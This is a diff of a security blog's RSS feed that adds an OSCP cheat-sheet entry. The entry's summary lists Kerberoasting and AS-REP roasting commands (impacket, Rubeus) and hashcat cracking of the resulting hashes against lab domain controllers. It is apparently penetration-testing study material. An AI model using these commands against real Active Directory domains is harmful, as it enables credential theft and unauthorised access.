@@ -3,17 +3,24 @@
   <channel>
     <title>Posts :: Zenu</title>
     <link>http://localhost:1313/posts/index.html</link>
-    <description>Cheat Sheets &amp; Tips&#xA;Active Directory File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest</description>
+    <description>Cheat Sheets &amp; Tips&#xA;Active Directory File Transfer OSCP_cheatsheet Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 16 Apr 2026 07:51:20 +0900</lastBuildDate>
+    <lastBuildDate>Tue, 28 Apr 2026 20:19:35 +0900</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>OSCP_cheatsheet</title>
+      <link>http://localhost:1313/posts/oscp_cheatsheet/index.html</link>
+      <pubDate>Tue, 28 Apr 2026 20:19:35 +0900</pubDate>
+      <guid>http://localhost:1313/posts/oscp_cheatsheet/index.html</guid>
+      <description>Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:&#xA;hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule&#xA;AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:</description>
+    </item>
     <item>
       <title>Active Directory</title>
       <link>http://localhost:1313/posts/ad/index.html</link>
       <pubDate>Thu, 16 Apr 2026 07:51:20 +0900</pubDate>
       <guid>http://localhost:1313/posts/ad/index.html</guid>
-      <description>Active Directory cheatsheet&#xA;GenericAll permission on a domain computer</description>
+      <description>Active Directory cheatsheet&#xA;AD Gmsapassword GenericAll permission on a domain computer Serestoreprivilege</description>
     </item>
     <item>
       <title>WebDAV Exploitation with davtest</title>
